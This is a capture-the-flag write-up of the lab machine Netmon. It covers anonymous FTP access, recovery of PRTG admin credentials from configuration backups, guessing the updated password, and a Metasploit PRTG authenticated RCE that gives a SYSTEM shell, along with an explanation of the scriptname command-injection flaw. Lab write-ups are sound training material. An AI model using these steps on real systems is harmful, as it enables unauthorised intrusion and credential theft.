# netmon

# Summary

- ftp server allow anonymous login
- ftp server contain PRTG configuration file and backup config; reveal PRTGadmin password
- guessed the new iteration of the password (same password with current year of box)
- execute PRTG authenticated RCE exploit to get SYSTEM shell

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sV -sC -oN nmap/netmon 10.10.10.152

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 16s, deviation: 0s, median: 16s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-09-23T16:12:33
|_  start_date: 2025-09-23T16:10:23
```

From the open ports, this is probably a Windows box. We see that anonymous login is allowed for ftp. Let’s investigate further:

```bash
ftp 10.10.10.152
```

We get a whole Windows C drive. A lot of information. Let’s visit the web page:

![image.png](netmon%20277068bbc57d8010a0c2f51bc197301f/image.png)

We also find the version on the bottom left:

![image.png](netmon%20277068bbc57d8010a0c2f51bc197301f/image%201.png)

```bash
PRTG Network Monitor 18.1.37.13946
```

Let’s see if the configuration file for PRTG is in the ftp server:

```bash
ftp 10.10.10.152

cd "Program Files (x86)/PRTG Network Monitor"
```

We don’t see a Configuration folder, which is where the login info are normally stored. Searching for default PRTG credential:

```bash
 creds search PRTG
+---------+-----------+-----------+
| Product |  username |  password |
+---------+-----------+-----------+
| prtg    | prtgadmin | prtgadmin |
+---------+-----------+-----------+

```

![image.png](netmon%20277068bbc57d8010a0c2f51bc197301f/image%202.png)

Did not work. 

Let’s check if we can upload in ftp:

```bash
cd /inetpub/wwwroot

put test.txt

local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||50187|)
550 Access is denied. 
```

It failed.

Searching up where the default location of the configuration files for PRTG, we find:

https://helpdesk.paessler.com/en/support/solutions/articles/76000041654-how-and-where-does-prtg-store-its-data-

We know we are looking for PRTG Configuration.dat. 

```bash
%programdata%\Paessler\PRTG Network Monitor
```

```bash
cd "programdata/Paessler\PRTG Network Monitor"

ftp> ls -la
229 Entering Extended Passive Mode (|||51033|)
125 Data connection already open; Transfer starting.
09-23-25  12:52PM       <DIR>          Configuration Auto-Backups
09-23-25  12:11PM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
09-23-25  12:11PM       <DIR>          Logs (Web Server)
09-23-25  12:16PM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
09-23-25  01:34PM              1698111 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database

```

Let’s download all the configuration files:

```bash
mget "PRTG Configuration.dat" "PRTG Configuration.old" "PRTG Configuration.old.bak"
```

Searching up administrator in the file, we find:

```bash
                  10
                </grpfoldsize>
                <homepage>
                  /welcome.htm
                </homepage>
                <lastlogin>
                  43522.1088048495
                </lastlogin>
                <login>
                  prtgadmin
                </login>
                <name>
                  PRTG System Administrator
                </name>
                <ownerid>
                  100
                </ownerid>
                <password>
                  <flags>
                    <encrypted/>
                  </flags>
                  <cell col="0" crypt="PRTG">
                    JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
                  </cell>
                  <cell col="1" crypt="PRTG">
                    OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
                  </cell>
                </password>
                <playsound>
```

Let’s try to crack the hash. Searching up how to decrypt PRTG password, we come across this:

[https://github.com/yobabyte/decryptocollection](https://github.com/yobabyte/decryptocollection)

Let’s download the script:

```bash
wget https://raw.githubusercontent.com/ghettorce/decryptocollection/main/prtg/prtg_string_decryptor.py

python3 -m venv myenv
source myenv/bin/activate

pip3 install pycryptodome
```

Looks like we also need GUID, since PRTG probably employs the latest algo. From the site, we get: *The **guid** value is stored in the attribute of **root** node in `PRTG Configuration.dat` file*.

```bash
  <root version="16" oct="PRTG Network Monitor 18.1.37.13946" saved="2/26/2019 2:54:23 AM" max="2017" guid="{221B25D6-9282-418B-8364-F59561032EE3}" treeversion="0" created="2019-02-02-23-18-27" trial="42f234beedd545338910317db1fca74dbe84030f">
```

After a little research, we found out that col 1 is the salt, and col 0 is the password. Let’s decrypt:

```bash
python3 prtg_string_decryptor.py aes --guid '{221B25D6-9282-418B-8364-F59561032EE3}' -s 'OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW' 'JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======'
```

However, this decrypts to nothing. The 'PRTG Configuration.old’ file has the same encrypted password as the original. However, the .bak file has a different one. Let’s try that:

```bash
python3 prtg_string_decryptor.py aes --guid '{221B25D6-9282-418B-8364-F59561032EE3}' -s 'M24VKFRECBEGN3ZQNGSET723GFIPVHYX' 'PDWXMOPZT43U2GKGR3YCBILXDMLAUZVBN27KGBOPKXRQ===='

None

```

Did not work. 

Searching for the username prtgadmin in the file resulted us in finding:

```bash
            <dbpassword>
	      <!-- User: prtgadmin -->
	      PrTg@dmin2018
            </dbpassword>
            <dbtimeout>
```

The password did not work. Let’s try the year the box is released:

```bash
PrTg@dmin2019
```

We are in. * careful not to try bruteforcing the login, otherwise you might lock out the account.

![image.png](netmon%20277068bbc57d8010a0c2f51bc197301f/image%203.png)

We also know that there is an authenticated RCE for PRTG. Let’s use metasploit:

```bash
msfconsole
use exploit/windows/http/prtg_authenticated_rce
set LHOST tun0
set ADMIN_PASSWORD PrTg@dmin2019
set RHOSTS 10.10.10.152
run
```

This flaw affects PRTG versions prior to 18.2.39. An authenticated user can create a custom "EXE" notification trigger, which executes scripts when events occur (e.g., sensor failures). The script name field in the notification setup lacks proper sanitization, allowing command chaining via appended OS commands (e.g., using & or | separators). When the notification is triggered, the injected command runs with SYSTEM privileges.

- **Root Cause**: Poor validation of the scriptname parameter in the /api/addobject.htm endpoint. User input is directly concatenated into a command string executed by the PRTG core service.
- **Impact**:
Arbitrary command execution, potentially leading to reverse shells,
persistence, or lateral movement. PRTG's role in monitoring means it can exfiltrate stored credentials for other systems.
- **CVSS Score**: 8.8 (High) – High privileges required, but low complexity.

![image.png](netmon%20277068bbc57d8010a0c2f51bc197301f/image%204.png)

We now have SYSTEM shell.